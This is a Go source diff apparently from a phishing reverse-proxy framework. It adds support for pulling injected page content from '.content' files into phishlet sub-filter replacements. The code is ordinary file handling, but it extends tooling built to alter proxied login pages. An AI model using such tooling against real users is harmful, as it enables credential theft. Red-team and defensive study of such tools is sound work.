@@ -2,6 +2,8 @@ package core
 
 import (
 	"fmt"
+	"os"
+	"path/filepath"
 	"regexp"
 	"strconv"
 	"strings"
@@ -435,6 +437,9 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		p.proxyHosts[0].is_landing = true
 	}
 
+	content_re := regexp.MustCompile(`(^.*?)(\{content:([^}]+)\})(.*$)`)
+	content_dir := filepath.Join(filepath.Dir(p.Path), p.Name + ".content")
+
 	if fp.SubFilters != nil {
 		for _, sf := range *fp.SubFilters {
 			if sf.Hostname == nil {
@@ -466,7 +471,22 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if sf.Path != nil {
 				*sf.Path = p.paramVal(*sf.Path)
 			} else {
+				sf.Path = new(string)
 				*sf.Path = ""
+			}
+
+			content_groups := content_re.FindStringSubmatch( *sf.Replace)
+			if len(content_groups) > 0 {
+				content_path := filepath.Join(content_dir, content_groups[3])
+				if _, err := os.Stat(content_path); os.IsNotExist(err) {
+				    return fmt.Errorf("content file: %s does not exist", content_path)
+				}
+				fileBytes, err := os.ReadFile(content_path)
+				if err != nil {
+					return fmt.Errorf("failed reading content file: %s", err)
+				}
+				content := string(fileBytes)
+				*sf.Replace = content_groups[1] + content + content_groups[4]
 			}
 
 			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Path, *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
